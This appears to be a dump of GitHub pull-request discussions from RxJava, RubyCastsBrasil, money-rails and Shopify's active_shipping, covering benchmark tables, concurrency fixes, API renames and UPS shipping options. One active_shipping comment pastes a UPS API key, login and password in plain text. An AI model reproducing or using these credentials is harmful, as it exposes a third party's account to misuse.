ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate        1000  thrpt         5   135453.628     2471.897    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate     1000000  thrpt         5      121.683       12.504    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread           1  thrpt         5     9304.443      381.064    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread        1000  thrpt         5     4957.975     1897.498    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread     1000000  thrpt         5       27.492        0.897    ops/s\r\n```"", 'I think the main cause of the fluctuation is the thread hopping of the emission of the source. If it hops to the observation thread, that is less traffic I guess. If you have time, you could modify the perf by adding subscribeOn which guarantees there is alway a thread boundary crossed.', 'I added `subscribeOn(computation())` (did you want modified perfs or extra perfs?) to the existing `ObserveOn` perfs on 1.x and observe-on-race branches and these are the results:\r\n\r\n```\r\n1.x branch:\r\n\r\nBenchmark                                         (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorObserveOnPerf.observeOnComputation         1  thrpt         5    39023.468    10714.207    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation      1000  thrpt         5     5815.699      607.484    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation   1000000  thrpt         5        8.863        0.779    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate           1  thrpt         5    73664.638    15363.977    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate        1000  thrpt         5    28392.278     2229.074    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate     1000000  thrpt         5       75.900        9.994    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread           1  thrpt         5     9634.822     5069.338    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread        1000  thrpt         5     5222.449     2559.225    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread     1000000  thrpt         5        8.931        1.078    ops/s\r\n\r\nobserve-on-race branch:\r\n\r\nBenchmark                                         (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorObserveOnPerf.observeOnComputation         1  thrpt         5    35758.208     2014.403    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation      1000  thrpt         5     5797.158      455.773    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation   1000000  thrpt         5        9.390        0.509    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate           1  thrpt         5    73051.368     5076.367    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate        1000  thrpt         5    20619.434     3587.966    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate     1000000  thrpt         5       77.932        6.377    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread           1  thrpt         5     9311.025      542.003    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread        1000  thrpt         5     3754.341      271.638    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread     1000000  thrpt         5        9.473        0.219    ops/s\r\n```', 'Extra perfs so they can be compared with the old anytime.', 'Righto, here are the perfs including new onSubscribe ones:\r\n\r\n```\r\n1.x branch:\r\n\r\nBenchmark                                                                (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorObserveOnPerf.observeOnComputation                                1  thrpt         5    70251.688     8961.723    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation                             1000  thrpt         5     9280.779     8214.742    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation                          1000000  thrpt         5       28.990        3.447    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation         1  thrpt         5    36056.035     2511.357    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation      1000  thrpt         5     5677.334      735.949    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation   1000000  thrpt         5        9.674        0.382    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                                  1  thrpt         5  8480014.275   172973.770    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                               1000  thrpt         5   135104.525     1579.495    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                            1000000  thrpt         5      122.858       13.194    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation           1  thrpt         5    72785.494     2701.185    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation        1000  thrpt         5    19612.208     4703.085    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation     1000000  thrpt         5       73.333       13.677    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                                  1  thrpt         5     9007.205      571.124    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                               1000  thrpt         5     5971.174      192.781    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                            1000000  thrpt         5       31.180        1.258    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation           1  thrpt         5     9540.089      363.964    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation        1000  thrpt         5     3790.601      188.191    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation     1000000  thrpt         5       10.008        0.328    ops/s\r\n\r\nobserve-on-race branch:\r\n\r\nBenchmark                                                                (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorObserveOnPerf.observeOnComputation                                1  thrpt         5    39214.570   158345.016    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation                             1000  thrpt         5    10669.899     1337.330    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation                          1000000  thrpt         5       29.230        1.805    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation         1  thrpt         5    36179.648     6840.388    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation      1000  thrpt         5     5844.341      185.774    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation   1000000  thrpt         5        9.566        0.294    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                                  1  thrpt         5  8283063.707   317079.693    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                               1000  thrpt         5   134060.544     5573.792    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                            1000000  thrpt         5      120.713       15.779    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation           1  thrpt         5   106156.191    43942.564    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation        1000  thrpt         5    27984.472     3232.294    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation     1000000  thrpt         5       76.865        8.196    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                                  1  thrpt         5     8890.780     1062.994    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                               1000  thrpt         5     5024.608      180.168    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                            1000000  thrpt         5       32.990        2.758    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation           1  thrpt         5     9114.271      314.387    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation        1000  thrpt         5     4271.852      977.703    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation     1000000  thrpt         5        9.647        0.831    ops/s\r\n```', ""@akarnokd I can maybe get a few percent improvement in most of the benchmarks by touching the volatile `requested` less in the loop but I'm thinking I should make a new PR out of that if we are happy with the correctness and performance of the current PR.\r\n\r\n```\r\nobserve-on-race branch:\r\n\r\nBenchmark                                                                (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorObserveOnPerf.observeOnComputation                                1  thrpt         5    39214.570   158345.016    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation                             1000  thrpt         5    10669.899     1337.330    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation                          1000000  thrpt         5       29.230        1.805    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation         1  thrpt         5    36179.648     6840.388    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation      1000  thrpt         5     5844.341      185.774    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation   1000000  thrpt         5        9.566        0.294    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                                  1  thrpt         5  8283063.707   317079.693    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                               1000  thrpt         5   134060.544     5573.792    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                            1000000  thrpt         5      120.713       15.779    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation           1  thrpt         5   106156.191    43942.564    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation        1000  thrpt         5    27984.472     3232.294    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation     1000000  thrpt         5       76.865        8.196    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                                  1  thrpt         5     8890.780     1062.994    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                               1000  thrpt         5     5024.608      180.168    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                            1000000  thrpt         5       32.990        2.758    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation           1  thrpt         5     9114.271      314.387    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation        1000  thrpt         5     4271.852      977.703    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation     1000000  thrpt         5        9.647        0.831    ops/s\r\n\r\nobserve-on-race branch, touch requested less:\r\n\r\nBenchmark                                                                (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorObserveOnPerf.observeOnComputation                                1  thrpt         5    72839.461    11872.361    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation                             1000  thrpt         5    10953.971     3684.071    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation                          1000000  thrpt         5       30.553        1.772    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation         1  thrpt         5    34296.824     2049.160    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation      1000  thrpt         5     6084.331      577.669    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputationSubscribedOnComputation   1000000  thrpt         5       10.296        0.272    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                                  1  thrpt         5  8622340.209    78646.722    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                               1000  thrpt         5   136452.092     3432.061    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate                            1000000  thrpt         5      122.923       15.274    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation           1  thrpt         5    72631.043     3254.035    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation        1000  thrpt         5    27904.731     5882.644    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediateSubscribedOnComputation     1000000  thrpt         5       79.129        7.015    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                                  1  thrpt         5     8623.913      898.953    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                               1000  thrpt         5     5256.389      197.299    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread                            1000000  thrpt         5       33.302        1.333    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation           1  thrpt         5     9287.645      468.941    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation        1000  thrpt         5     3916.492      176.669    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThreadSubscribedOnComputation     1000000  thrpt         5       10.401        0.743    ops/s\r\n```"", 'Almost good and the performance is mostly okay:\r\n\r\n![image](https://cloud.githubusercontent.com/assets/1269832/7449353/c979a514-f234-11e4-8a5b-68cb9c9661bf.png)\r\n', ""Don't need to update the perfs because the error path not taken. Are you happy with perfs as they are or would you like to add testing of the error path?"", ""I'm happy with the perf."", ""Looks good to me, but I'd like to invite @benjchristensen to review it as well."", '@akarnokd Seeing as error bypasses the queue do you think I should add `queue.clear()` just before calling `child.onError()` so that the entries in the queue can be garbage collected?', 'In fact could clear the queue in `onError` method so that gc can happen before next scheduled `pollQueue`.', 'That would break the queue. Instead, clear the queue on the pollQueue side before emitting onError.', 'PR updated with clearing the queue on the pollQueue side before emitting onError.', ""I've got this on my list to review."", 'One more race condition. We need to increment `requested` with care because if is Long.MAX_VALUE and gets decremented then a request for one comes in (which uses BackpressureUtils to take us back up to Long.MAX_VALUE) then the increment on request happens and overflows. Fix is to use BackpresureUtils to increment.', 'I never understood why it does that many request updates. Here is a simpler version:\r\n```java\r\nint emitted = 0;\r\ndo {\r\n    counter = 1;\r\n    long produced = 0;\r\n    long r = requested;\r\n    while (!child.isUnsubscribed()) {\r\n        Throwable error;\r\n        if (completed) {\r\n            if ((error = this.error) != null) {\r\n                child.onError(error);\r\n                return;\r\n            } else\r\n            if (queue.isEmpty()) {\r\n                child.onCompleted();\r\n                return;\r\n            }\r\n        }\r\n        if (r > 0) {\r\n            Object o = queue.poll();\r\n            if (o != null) {\r\n                child.onNext(on.getValue(o));\r\n                r--;\r\n                emitted++;\r\n                produced++;\r\n            } else {\r\n                break;\r\n            }\r\n        } else {\r\n            break;\r\n        }\r\n    }\r\n    if (produced > 0) {\r\n        REQUESTED.addAndGet(this, -produced);\r\n    }\r\n} while (COUNTER_UPDATER.decrementAndGet(this) > 0);\r\nif (emitted > 0) {\r\n    request(emitted);\r\n}\r\n```', 'Pada 01/05/2015 8:53 AM, ""Dave Moten"" <notifications@github.com> menulis:\n>\n> seeing as I don\'t use AtomicInteger methods on status I may as well just\nuse a byte to store these. I\'ll update the PR\n>\n> --\n> Reply to this email directly or view it on GitHub.\n', 'Nice David, I was going to do that in a later PR but now seems good!\n\nOn Sat, 9 May 2015 18:24 eliyana281180 <notifications@github.com> wrote:\n\n> Pada 01/05/2015 8:53 AM, ""Dave Moten"" <notifications@github.com> menulis:\n> >\n> > seeing as I don\'t use AtomicInteger methods on status I may as well just\n> use a byte to store these. I\'ll update the PR\n> >\n> > --\n> > Reply to this email directly or view it on GitHub.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/ReactiveX/RxJava/pull/2929#issuecomment-100447547>.\n>\n']"
100,ReactiveX/RxJava,2975.0,"The existing six methods below didn't make sense and caused some confusion.

```
timer(delay, timeUnit[, scheduler]);  --> emits 0 after delay and completes
timer(delay, period, timeUnit[, scheduler]); --> emits 0 after delay and then i++ after every period forever
interval(period, timeUnit[, schduler); --> emits i++ after every period forever
```

I felt that the middle method acted more like the third method `interval` than first method `timer`.  This PR is to make this change.

```
 timer(delay, timeUnit[, scheduler]);  --> emits 0 after delay and completes
+@Deprecated
 timer(delay, period, timeUnit[, scheduler]); --> emits 0 after delay and then i++ after every period forever
+interval(delay, period, timeUnit[, scheduler]); --> emits 0 after delay and then i++ after every period forever
 interval(period, timeUnit[, schduler); --> emits i++ after every period forever
```

PS: yes, I understand that we can't delete the deprecated timer method.
@davgross and if this PR is merged will have to change the images.","[""Okay, I think I'm done changing the PR unless there are other comments."", ""I'm not in favor of these changes."", 'any particular reason?', ""If it were only a matter of aliasing, I wouldn't see any problem, but you deprecate a historical method just because the name. Every use place need to be changed to avoid deprecation warnings in RxJava and outside it."", 'I think it improved clarity of API and is directly related to a bug we had here.  This PR already takes care of migrating the RxJava usages of timer to interval.', ""The timer-interval confusion apparently is quite common so I'm going to merge this. Thanks for the changes.""]"
101,RubyCastsBrasil/RubyCastsBrasil,68.0,"Como esse  um pull request mais longo, abri ele logo antes de terminar, assim podemos ir debatendo aqui o cdigo.","[""I've prepared a stage. <a href='http://victorlcampos-adicionando-cast.rubycastsbrasil-rubycastsbrasil-6911c480730f8efd946f.ttrcloud.com' target='_blank'>Click to open.</a>"", '\n[![Coverage Status](https://coveralls.io/builds/1065463/badge)](https://coveralls.io/builds/1065463)\n\nCoverage increased (+0.1%) when pulling **1e33645885867423832cbc9523be1c0c91cd4754 on victorlcampos:adicionando_cast** into **eadc0f4a67844d1cb0af91a879fc1cf8fa7c11f5 on RubyCastsBrasil:master**.\n', 'Tranquilo @victorlcampos . =)\r\n\r\nJ\xc3\xa1 dou meu feedback. =)', '@victorlcampos Fiz uns coment\xc3\xa1rios bem superfluos. Nada importante.\r\n\r\nVoc\xc3\xaa conhece a gem [responders](https://github.com/plataformatec/responders)? e a gem [zertico](https://github.com/zertico/zertico) ?\r\n\r\nAcho que elas podem nos ajudar a n\xc3\xa3o precisar ficar definindo `Controllers` e ficar testando eles. =)\r\nO que mais gosto de us\xc3\xa1las \xc3\xa9 para manter todo o meu c\xc3\xb3digo em modelos e os controllers o mais limpo poss\xc3\xadvel. \xc3\x89 mais uma id\xc3\xa9ia. Eu gosto de trabalhar assim e entendo que isso \xc3\xa9 quest\xc3\xa3o de opini\xc3\xa3o, por isso estou apenas perguntando. :smiley: ', 'N\xc3\xa3o conhe\xc3\xa7o nenhuma das duas gems', 'Ta tranquilo ent\xc3\xa3o @victorlcampos . Finaliza ae que depois eu mando um pull request utilizando elas em cima do seu c\xc3\xb3digo. Fica mais f\xc3\xa1cil da gente discutir em cima. =)', '\n[![Coverage Status](https://coveralls.io/builds/1066732/badge)](https://coveralls.io/builds/1066732)\n\nCoverage increased (+0.3%) when pulling **84112eb01c351c7f1ed0def2c237b2cf48f2a8b5 on victorlcampos:adicionando_cast** into **eadc0f4a67844d1cb0af91a879fc1cf8fa7c11f5 on RubyCastsBrasil:master**.\n', 'Acho que faltou coment\xc3\xa1rio', 'Atualizei l\xc3\xa1. ehheheh =)', '\n[![Coverage Status](https://coveralls.io/builds/1066768/badge)](https://coveralls.io/builds/1066768)\n\nCoverage increased (+0.29%) when pulling **9ef833949dcd2116b386eb02fb9d9a01e58cc1a2 on victorlcampos:adicionando_cast** into **eadc0f4a67844d1cb0af91a879fc1cf8fa7c11f5 on RubyCastsBrasil:master**.\n', 'Ficou massa @victorlcampos . Posso so te pedir um \xc3\xbaltimo favor?\r\n\r\nVoc\xc3\xaa faz o rebase dos seus commits em 1 s\xc3\xb3 para que fique f\xc3\xa1cil rastrear no futuro por que um arquivo foi alterado/adicionado/removido?\r\n\r\nDae eu ja mergeio aqui. =)', 'closes #65 ', 'Boa @victorlcampos . Passando os testes ae eu ja mergeio. =)\r\nSe n\xc3\xa3o for pedir demais, voc\xc3\xaa acertas os detalhes que o @houndci comentou? \r\nEu sei, to pedindo muito j\xc3\xa1. hehehehehh\r\n\r\nOBS: Ta ficando maneira a parada agora. =)', '\n[![Coverage Status](https://coveralls.io/builds/1066863/badge)](https://coveralls.io/builds/1066863)\n\nCoverage increased (+0.25%) when pulling **c36a8f6c2c6645f45a9e34c0192d86abc5541b26 on victorlcampos:adicionando_cast** into **4bc4551ea790950797ade79991ac1cfddde2a248 on RubyCastsBrasil:master**.\n', 'Ja fiz o commit acertando aqui. Vou mergear e mando o commi depois. =)', 'Obrigado pela contribui\xc3\xa7\xc3\xa3o @victorlcampos ', 'Tem como rodar o @houndci localmente?', 'N\xc3\xa3o. S\xc3\xb3 em pull request mesmo. Ele usa a gem `rubocop` para fazer o servi\xc3\xa7o. O @houndci \xc3\xa9 s\xc3\xb3mente um webservice que fica dando watch nos pull request e comentando o que a gem `rubocop` gospe.\r\n\r\nSe quiser testar localmente, voc\xc3\xaa pode colocar a gem rubocop no projeto e criar um arquivo pro rubocop com o mesmo conte\xc3\xbado do arquivo [.hound.yml](https://github.com/RubyCastsBrasil/RubyCastsBrasil/blob/master/.hound.yml). =)']"
102,RubyCastsBrasil/RubyCastsBrasil,73.0,"Alguns pontos a ser levantado:

1 - Criei um modelo perfil, para deixar o usurio somente com os dados de login, enquanto o perfil ficaria com todos os outros dados: Nome, Descrio, Empresa, Links, Foto, etc...

2 - No me preocupei muito com a view pois estamos ainda debatendo o layout, fiz o suficiente para a feature funcionar e deixar encaminhado para quem for pegar a view

3 - Ainda falta internacionalizar algumas coisas

4 - No curti muito a soluo que fui obrigado a dar para conseguir fazer o render da view edit do usurio, primeiro porque tive que recriar mtodos, segundo porque  tive que colocar a partial na pasta application. Outra soluo seria ter uma view especfica para cadastro de perfil, mas como no queria modificar muito a view, deixei assim mesmo.","[""I've prepared a stage. <a href='http://victorlcampos-adicionando-link-perfil.rubycastsbrasil-rubycastsbrasil-6911c480730f8efd946f.ttrcloud.com' target='_blank'>Click to open.</a>"", '\n[![Coverage Status](https://coveralls.io/builds/1081818/badge)](https://coveralls.io/builds/1081818)\n\nChanges Unknown when pulling **1828f21fa4ce5b130faa8c5a703a677fcd4c37ab on victorlcampos:adicionando_link_perfil** into ** on RubyCastsBrasil:master**.\n', 'N\xc3\xa3o saquei ao certo qual o problema 4. Com rela\xc3\xa7\xc3\xa3o a recriar m\xc3\xa9todos voc\xc3\xaa fala do controller?', 'O 4 n\xc3\xa3o \xc3\xa9 bem um problema, funciona, eu s\xc3\xb3 n\xc3\xa3o gostei da solu\xc3\xa7\xc3\xa3o, se algu\xc3\xa9m tiver uma solu\xc3\xa7\xc3\xa3o melhor eu estou aceitando.', '\n[![Coverage Status](https://coveralls.io/builds/1082967/badge)](https://coveralls.io/builds/1082967)\n\nChanges Unknown when pulling **d8f9661cd92f25487508c3500ca1c0c9fbd2cd17 on victorlcampos:adicionando_link_perfil** into ** on RubyCastsBrasil:master**.\n', 'Bom. se no 4 voc\xc3\xaa estiver falando do `Controller` a gente pode acertar isso com a gem `Zertico`.\r\nUsando ela, voc\xc3\xaa pode limpar esse controller por completo. =)\r\n\r\nQuanto aos helpers, erros da view e tudo mais. Acredito que voc\xc3\xaa poderia resolver tudo isso fazendo o user aceitar nested_attribtutes dos links e adicionando isso ao form original do devise. Que tal?', '@plribeiro3000  Explique mais sobre esta gem. Acho que vou precisar dela ent\xc3\xa3o se for o que estou pensando.', '@ocsjwolf Resumindo, ela transforma o controller numa classe ""inteligente"" que ja vai ter as 7 actions rest definidas. O controller tenta adivinha o modelo a partir do seu proprio nome. Mas o interessante \xc3\xa9 que voc\xc3\xaa consegue sobreescrever o comportamento padr\xc3\xa3o desse controller sem precisar escrever uma linha de c\xc3\xb3digo no Controller. Basta voc\xc3\xaa criar uma das classes de suporte (`Service`, `Responder`, `PermittedParams`) que voc\xc3\xaa vai mudar o comportamento padr\xc3\xa3o de forma que testar essa modifica\xc3\xa7\xc3\xa3o ser\xc3\xa1 apenas testar o valor de uma string em uma classe ruby PORO.\r\n\r\nO resumo ainda ficou grande. auheuhaeuhaueh\r\nMas acho mais interessante a gente montar um Hangout se for o caso, por que ai fica mais f\xc3\xa1cil da gente conversar. Que tal?', 'Seria legal vc j\xc3\xa1 gravar um Cast falando da Gem.', 'Isso \xc3\xa9 um dos meus planos, mas por agora inda precise fechar um detalhe nela para fazer o release de uma major version que vai adicionar muitas novas funcionalidades, melhorar outras e mudar algumas apis para ficar mais f\xc3\xa1cil de interagir com ela. A\xc3\xad por agora ainda n\xc3\xa3o rola um cast.\r\n\r\nMas o hangout rola sim. Qualquer coisa eu gravo o hangout e depois disponibilizo para quem n\xc3\xa3o puder participar. =)', '@plribeiro3000 s\xc3\xb3 que links n\xc3\xa3o s\xc3\xa3o do usu\xc3\xa1rio, s\xc3\xa3o do profile.\r\n\r\nOutro ponto \xc3\xa9 que para voc\xc3\xaa editar um usu\xc3\xa1rio, usando o controller padr\xc3\xa3o do devise \xc3\xa9 necess\xc3\xa1rio colocar a senha, o que n\xc3\xa3o faz sentido nenhum nesse caso.\r\n\r\nE caso eu criasse um controller novo, teria que colocar os helpers da mesma forma.', '@victorlcampos Entendi seu ponto de vista. Faz sentido. Acredito que podemos manter assim e tocar o barco. Mais a frente podemos rever isso. Bom que n\xc3\xa3o ficamos muito tempo travados em algo.\r\n\r\nJ\xc3\xa1 vou adicionar uma issue para refatorar isso de alguma forma mais elegante, mas para o momento concordo contigo e a sua solu\xc3\xa7\xc3\xa3o \xc3\xa9 suficiente. =)\r\n\r\nObrigado pela sua contribui\xc3\xa7\xc3\xa3o!']"
103,RubyMoney/money-rails,75.0,"when default currency is changed. the amount column in the database
has a postfix of the subunit of the currency so set

likewise for the currency column as well. It also changes the
default value to the currencies iso code

add gem debugger for ruby 1.9 and ruby-debug for ruby 1.8","['I will gladly merge this if you fix the failing specs :)', 'super!!! thnx for your contribution :)', '@alup fixed failing tests. \r\nPS: default_currency is set to EUR in spec/dummy/config/initializers/money.rb\r\n']"
104,Shopify/active_shipping,192.0,"Do to nuances in how First Class mail pricing is returned, we need to fall back to commercial base pricing if it happens to cost less than commercial plus:

```
        <Postage CLASSID=""61"">
            <MailService>First-Class&amp;lt;sup&amp;gt;&amp;#8482;&amp;lt;/sup&amp;gt; Package Service</MailService>
            <Rate>0.00</Rate>
            <CommercialRate>2.76</CommercialRate>
            <CommercialPlusRate>4.05</CommercialPlusRate>
        </Postage>
```

cc @RichardBlair @snormore ","['cc @jnormore :)', ""I'm curious why exactly this is needed?\r\nThis also seems like business logic. Is this the place for that or should we be keeping these sort of adjustments in Shopify?"", '@garethson I have the same questions as @RichardBlair ', ""@jduff We've had offline discussions here. The USPS API returns multiple rates that are not usable. Logic is required to determine which rate should be used. (It can be Rate, CommericalRate, or the CommercialPlusRate). Our other options are are to start returning multiple rates for a single service (not done anywhere else in ActiveShipping), or start making multiple requests to USPS to get a single list of rates.""]"
105,Shopify/active_shipping,218.0,"This updates the legacy Canada Post carrier to use Nokogiri to generate XML requests and parse XML responses, instead of XmlNode and REXML respectively.

I'd like to get rid of XmlNode and standardize on Nokogiri for XML processing. This is one step in that direction. The other option is to standardize on REXML + Builder. Nokogiri is fasterand built on top of a battle tested libxml, but REXML + Builder are pure Ruby. What do you think?

@Shopify/shipping ","['Note: the remote tests pass as well.', ':+1: for this.', 'Nokogiri is widely used and massively faster. Lets use it and stick with it.', 'Cool, I am merging this!']"
106,Shopify/active_shipping,237.0,"This adds some more options to create_shipment for UPS.
I believe these options are necessary for shipping internationally.
They are definitely necessary for making use of paperless_invoice which allows one to ship commercial packages internationally without printing out a customs invoice.","['Some comments and questions, looks like a great addition.', ""Thanks for the comments. I'll go ahead and do what you suggest at some point this weekend or on Monday morning and push an update."", ""Ok I cleaned up the reference number thing. You have to put the reference numbers in a different place in the xml based on the origin and destination. I tried to make it more explicit what's happening. If you pass in options[:reference_numbers] it will stick them in the right place by default based on the origin and destination."", ""I'd like tor run the remote tests for the stuff that requires an origin account before merging. Unfortunately I do not have test credentials I can use. Any chance you can share them with me in a secure way? Ping me at willem AT shopify DOT com"", 'Anything else I can do to get this merged?', '@Shopify/shipping So.... Can we merge? Can we merge? Or like what else do you want me to do?', ""Greetings @eboswort,\r\n\r\nThanks so much for contributing to the project. Yes let's definitely get this merged. My only reservation is the disabled tests. Somehow we need to get creds that we can share so that we can run these tests.\r\n\r\nIf we can't get the creds in the next day or two, let's merge this anyways so you're not blocked. I just want to make sure we don't introduce untestable code into the system. \r\n\r\nThoughts?"", ""Hi Rob! \r\nThanks for having me as a contributor. :)\r\nI totally understand you not wanting a bunch of skipped tests on master. But I am definitely trying to start using this stuff pretty soon. If you guys want more time then let me know and I can just work off a fork in the meantime. \r\nWhat problems are you running into getting credentials?\r\nUPS has pretty awful support for testing. I just confirmed with them that there's no way to create a testing shipper account. But I think I know the necessary steps to create an empty account for active_shipping that could be used only by travis CI for testing. \r\nYou can create a free account on ups.com and also create a shipper account. As long as you don't select an automatic pickup option for that latter then I'm pretty sure that's free too. So if you do those two things and don't give ups any billing info then you could just share those credentials publicly. I would do it, but I figure it should probably be connected to a shopify email address since you guys are managing this thing.\r\nOr did you try something along those lines and run into trouble?\r\n\r\n"", 'I created a new UPS account, which I\'m going to share with you. Still getting test failures. Are they passing with your account?\r\n\r\n### Test results\r\n```\r\n07:26:55 {CasperSleep-international_ups_shipping} ~/src/active_shipping$  bundle exec ruby -Ilib:test test/remote/ups_test.rb \r\nRun options: --seed 15186\r\n\r\n# Running:\r\n\r\n..F...S......E.FS\r\n\r\nFinished in 9.473338s, 1.7945 runs/s, 3.9057 assertions/s.\r\n\r\n  1) Failure:\r\nRemoteUPSTest#test_obtain_shipping_label [test/remote/ups_test.rb:220]:\r\ntest/fixtures.yml must have a valid ups/origin_account for this test to run\r\n\r\n\r\n  2) Error:\r\nRemoteUPSTest#test_obtain_shipping_label_without_dimensions:\r\nRuntimeError: Could not obtain shipping label. Failure.\r\n    /home/vagrant/src/active_shipping/lib/active_shipping/carriers/ups.rb:162:in `rescue in create_shipment\'\r\n    /home/vagrant/src/active_shipping/lib/active_shipping/carriers/ups.rb:132:in `create_shipment\'\r\n    test/remote/ups_test.rb:243:in `test_obtain_shipping_label_without_dimensions\'\r\n\r\n\r\n  3) Failure:\r\nRemoteUPSTest#test_obtain_international_shipping_label [test/remote/ups_test.rb:262]:\r\ntest/fixtures.yml must have a valid ups/origin_account for this test to run\r\n\r\n17 runs, 37 assertions, 2 failures, 1 errors, 2 skips\r\n\r\nYou have skipped tests. Run with --verbose for details.\r\n```\r\n\r\n### Creds\r\n```\r\n cat ~/.active_shipping/credentials.yml \r\nups:\r\n  key: ""7CE85DED4C9D07AB""\r\n  login: ""shopifolk""\r\n  password: ""Shopify_rocks""\r\n```', 'Looks like that\'s failing cause you don\'t have a shipper account. A shipper 